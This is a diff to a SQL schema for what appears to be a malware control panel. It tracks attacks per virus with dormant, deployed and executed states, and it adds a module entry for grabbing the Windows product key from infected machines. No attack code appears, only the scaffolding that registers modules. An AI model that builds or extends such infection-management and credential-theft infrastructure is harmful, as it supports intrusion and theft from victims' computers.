@@ -32,7 +32,7 @@ CREATE TABLE IF NOT EXISTS attacks
 (
     attack_id      varchar(64)  not null, /* sha256 hash */
     virus_id       varchar(64)  not null, /* sha256 hash */
-    attack_package varchar(100) not null, /* attack package, like org.kelvinho.scanPartitions */
+    attack_package varchar(100) not null, /* attack package, like win.oneTime.ScanPartitions */
     status         varchar(10)  not null, /* dormant | deployed | executed */
     executed_time  int          not null default 0, /* unix timestamp */
     name           varchar(50)  not null, /* short text of the attack, to identify itself */
@@ -139,3 +139,9 @@ VALUES ("win.oneTime.SystemInfo",
         "Windows/OneTime/SystemInfo",
         "easy.SystemInfo",
         "Get some basic system information.");
+INSERT INTO packageInfo (package_name, class_name, location, display_name, description)
+VALUES ("win.oneTime.ProductKey",
+        "\\Kelvinho\\Virus\\Attack\\Packages\\Windows\\OneTime\\ProductKey\\ProductKey",
+        "Windows/OneTime/ProductKey",
+        "easy.ProductKey",
+        "Get Windows product key");
